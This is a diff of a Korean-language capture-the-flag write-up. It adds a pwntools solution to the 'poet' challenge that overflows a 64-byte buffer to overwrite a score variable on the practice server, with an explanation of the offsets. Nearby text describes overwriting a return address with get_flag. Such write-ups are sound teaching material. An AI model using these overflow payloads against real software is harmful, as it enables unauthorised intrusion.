@@ -35,7 +35,28 @@ flag는 이 함수를 통해 얻는다고 예상했다. vuln 함수의 경우에
 replace 함수는 "I"를 "YOU"로 대체하는데 dummy의 크기를 3배 늘려 버퍼에 복사가능하도록 해준다. 
 따라서 dummy 값으로 "I"를 사용하고 ret에는 get_flag의 주소를 집어넣으면 flag를 얻을 수 있다. 
 ## poet
-**풀지 못했습니다**
+~~~python
+from pwn import *
+
+r=remote("ctf.j0n9hyun.xyz",3012)
+point = 999900
+payload='A'*64+p32(point)
+r.recvuntil("> ")
+r.sendline("eat")
+r.recvuntil("> ")
+r.sendline(payload)
+
+r.interactive()
+~~~
+푸는 방법이 특이한 문제이다. 개인적으로 lob보다 더 취향에 맞는 거 같다.
+nc를 통해 실행시켜보면 enter 부분과 저자 두 부분에 입력이 가능하다.
+그리고 점수가 10000이 넘어가게 되면 reward()함수를 통해 flag를 주어진다고 밝혀져있다. 
+get_poem에서 unk_6024A0라는 변수가 BSS 영역에 있는 것을 알 수 있다.
+unk_6024a0의 주소는 0x6024a0d이다. 이 문제는 점수를  1000000으로 만들어서 flag를 얻어야 한다. 
+따라서 문제의 양식에 따라 100점을 얻어주고 point를 999900으로 만들어서 합 1000000을 flag를 얻어낸다. 
+점수를 의미하는 변수 dword_6024e0와 0x6024a0의 거리차는 64이므로 
+0x6024a0에 64개의 dummy 값과 999900 을 넣어주면 flag가 주어진다.
+
 ## 1996
 **풀지 못했습니다**
 ## Random Key
